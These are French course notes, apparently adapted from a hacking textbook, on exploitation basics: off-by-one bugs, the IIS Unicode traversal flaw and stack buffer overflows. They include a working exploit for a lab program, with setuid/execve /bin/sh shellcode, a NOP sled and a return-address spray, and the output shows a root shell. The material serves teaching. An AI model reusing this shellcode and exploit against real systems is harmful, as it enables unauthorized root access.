# EXPLOITATION

## <mark style="color:red;">Introduction</mark>

### <mark style="color:blue;">Principe de Base</mark>

* **L'exploitation** = forcer un ordinateur à faire ce qu'on veut, même si le programme était conçu pour l'empêcher
* Les programmes suivent leurs instructions **à la lettre**, pas nécessairement l'intention du programmeur
* Les failles de sécurité sont des défauts de conception ou des oublis

### <mark style="color:blue;">Types d'Erreurs Courantes</mark>

#### Erreurs "Off-by-One" (Fencepost Errors)

* **Exemple classique** : Pour une clôture de 100 pieds avec poteaux tous les 10 pieds → il faut 11 poteaux, pas 10
* **Erreur de comptage** : confondre le nombre d'éléments avec le nombre d'espaces
* Ces erreurs passent souvent inaperçues lors des tests normaux

#### Exemple Concret : OpenSSH

* **Code bugué** : `if (id < 0 || id > channels_alloc)`
* **Code correct** : `if (id < 0 || id >= channels_alloc)`
* **Conséquence** : utilisateur normal peut obtenir des droits administrateur

### <mark style="color:blue;">Complexité = Vulnérabilité</mark>

#### Cas Microsoft IIS

* **Problème initial** : empêcher l'utilisation de `\` pour traverser les dossiers
* **Ajout Unicode** : nouvelle complexité avec `%5c` = `\`
* **Faille** : `%5c` n'était pas détecté par le code de vérification
* **Exploitation** : vers Sadmind et CodeRed

### <mark style="color:blue;">Principe Universel</mark>

* Ces concepts de "hacking" dépassent l'informatique
* **Exemple juridique** : Affaire LaMacchia (piratage sans gain financier = légal à l'époque)
* Les systèmes complexes ont toujours des failles exploitables

***

## <mark style="color:red;">Débordements de Tampon</mark>

Bien que la simplicité de C augmente le contrôle du programmeur et l'efficacité des programmes résultants, elle peut aussi résulter en des programmes vulnérables aux débordements de tampon et aux fuites mémoire si le programmeur n'est pas prudent.

{% hint style="info" %}
Cela signifie qu'une fois qu'une variable se voit allouer de la mémoire, il n'y a pas de sauvegardes intégrées pour s'assurer que le contenu d'une variable tient dans l'espace mémoire alloué. Si un programmeur veut mettre dix octets de données dans un tampon qui n'avait que huit octets d'espace alloués, ce type d'action est autorisé, même si cela causera très probablement le crash du programme. C'est ce qu'on appelle un débordement de tampon, puisque les deux octets supplémentaires de données vont déborder et se répandre hors de la mémoire allouée, écrasant tout ce qui arrive à venir ensuite. Si une donnée critique est écrasée, le programme va crasher.
{% endhint %}

### <mark style="color:blue;">overflow\_example.c</mark>

```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
int value = 5;
char buffer_one[8], buffer_two[8];
strcpy(buffer_one, "one"); /* Met "one" dans buffer_one. */
strcpy(buffer_two, "two"); /* Met "two" dans buffer_two. */
printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);
printf("\n[STRCPY] copying %d bytes into buffer_two\n\n", strlen(argv[1]));
strcpy(buffer_two, argv[1]); /* Copie le premier argument dans buffer_two. */
printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
```

```
reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c
reader@hacking:~/booksrc $ ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)
[STRCPY] copying 10 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
reader@hacking:~/booksrc $
```

Notez que buffer\_one est situé directement après buffer\_two en mémoire, donc quand dix octets sont copiés dans buffer\_two, les deux derniers octets de 90 débordent dans buffer\_one et écrasent tout ce qui était là.

```
reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 29 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
```

Ces types de crashes de programme sont assez courants - pensez à toutes les fois qu'un programme a crashé ou fait un écran bleu sur vous. L'erreur du programmeur est une erreur d'omission - il devrait y avoir une vérification de longueur ou une restriction sur l'entrée fournie par l'utilisateur. Ces types d'erreurs sont faciles à faire et peuvent être difficiles à repérer. En fait, le programme notesearch.c de la page 93 contient un bug de débordement de tampon. Vous ne l'avez peut-être pas remarqué jusqu'à maintenant, même si vous étiez déjà familier avec C.

```
reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
```

### <mark style="color:blue;">exploit\_notesearch.c</mark>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
int main(int argc, char *argv[]) {
unsigned int i, *ptr, ret, offset=270;
char *command, *buffer;
command = (char *) malloc(200);
bzero(command, 200); // Remet à zéro la nouvelle mémoire.
strcpy(command, "./notesearch \'"); // Commence le tampon de commande.
buffer = command + strlen(command); // Met le tampon à la fin.
if(argc > 1) // Définit l'offset.
offset = atoi(argv[1]);
ret = (unsigned int) &i - offset; // Définit l'adresse de retour.
for(i=0; i < 160; i+=4) // Remplit le tampon avec l'adresse de retour.
*((unsigned int *)(buffer+i)) = ret;
memset(buffer, 0x90, 60); // Construit le NOP sled.
memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
strcat(command, "\'");
system(command); // Lance l'exploit.
free(command);
}
```

Le code source de cet exploit sera expliqué en profondeur plus tard, mais en général, il ne fait que générer une chaîne de commande qui exécutera le programme notesearch avec un argument de ligne de commande entre guillemets simples. Il utilise des fonctions de chaîne pour faire cela : strlen() pour obtenir la longueur actuelle de la chaîne (pour positionner le pointeur de tampon) et strcat() pour concaténer le guillemet simple de fermeture à la fin. Finalement, la fonction system est utilisée pour exécuter la chaîne de commande.

Le tampon qui est généré entre les guillemets simples est la vraie substance de l'exploit. Le reste n'est qu'une méthode de livraison pour cette pilule empoisonnée de données. Regardez ce qu'un crash contrôlé peut faire.

```
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
```

L'exploit est capable d'utiliser le débordement pour servir un shell root - fournissant un contrôle total sur l'ordinateur. C'est un exemple d'un exploit de débordement de tampon basé sur la pile.
